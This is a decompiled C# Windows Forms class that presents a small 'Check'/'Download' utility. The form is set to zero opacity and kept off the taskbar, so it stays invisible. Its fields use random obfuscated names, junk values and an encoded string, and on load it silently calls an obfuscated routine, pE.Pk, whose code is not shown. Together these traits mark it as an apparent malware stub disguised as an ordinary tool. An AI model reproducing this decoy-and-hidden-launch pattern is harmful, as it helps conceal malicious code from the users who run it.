using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Basic;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	private long B64RPLtB428BD60k3cn77;

	private long ORMCm6Sj962Zg1E6;

	private bool e1p0XZP9nwEW94f;

	private bool b9HQBEIWn858yFameIb90rM1062IUfVFq;

	private int I88C8ANU2URn1HP8969fGTCmV4472T7DG;

	private long Fwit1z7K8Ha;

	private string pA0znaY9dITdfy0oztym;

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Button1 = value;
		}
	}

	internal virtual Button Button2
	{
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Button2 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar1 = value;
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		B64RPLtB428BD60k3cn77 = 1791L;
		ORMCm6Sj962Zg1E6 = 422918260L;
		e1p0XZP9nwEW94f = true;
		b9HQBEIWn858yFameIb90rM1062IUfVFq = false;
		I88C8ANU2URn1HP8969fGTCmV4472T7DG = 35;
		Fwit1z7K8Ha = 6L;
		pA0znaY9dITdfy0oztym = "+w‡\u008fv9\\JIt!!;&95TWWb-h3\u008fX'R!]rjg‚[lh9eULOZjg]\\vT^<W ‘…jVcŠWnz[\u007fj)M2rMd\u008f‚!+3e‘_RŽD\u0090UA:ih\u008f„5$A-zd†m’]0I#&Œ@h‘†q$W$X[J|%^ORw6\u00817`mt:Y@‹‘!Be@‰[ eku=\u007fp |eO{€/";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_024a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0254: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Button1 = new Button();
		Button2 = new Button();
		TextBox1 = new TextBox();
		ProgressBar1 = new ProgressBar();
		((Control)this).SuspendLayout();
		Button button = Button1;
		Point location = new Point(13, 13);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		Size size = new Size(149, 38);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(0);
		((ButtonBase)Button1).set_Text("Check");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		Button button3 = Button2;
		location = new Point(169, 13);
		((Control)button3).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button4 = Button2;
		size = new Size(159, 38);
		((Control)button4).set_Size(size);
		((Control)Button2).set_TabIndex(1);
		((ButtonBase)Button2).set_Text("Download");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		TextBox textBox = TextBox1;
		location = new Point(32, 62);
		((Control)textBox).set_Location(location);
		TextBox1.set_Multiline(true);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		size = new Size(276, 50);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(2);
		ProgressBar progressBar = ProgressBar1;
		location = new Point(13, 127);
		((Control)progressBar).set_Location(location);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		ProgressBar progressBar2 = ProgressBar1;
		size = new Size(315, 23);
		((Control)progressBar2).set_Size(size);
		((Control)ProgressBar1).set_TabIndex(3);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(340, 162);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Check from");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		pE.Pk("PP");
	}
}
